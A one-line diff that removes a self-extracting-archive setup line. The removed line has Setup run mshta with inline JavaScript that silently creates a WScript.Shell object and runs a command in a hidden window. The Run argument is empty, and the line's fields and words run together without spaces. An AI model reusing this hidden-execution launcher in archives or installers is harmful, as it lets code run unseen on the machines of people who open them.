@@ -1,1 +1,0 @@
-SavePathSetup=mshta"javascript:newActiveXObject('WScript.Shell').Run('',0);window.close()"silent=1Overwrite=1
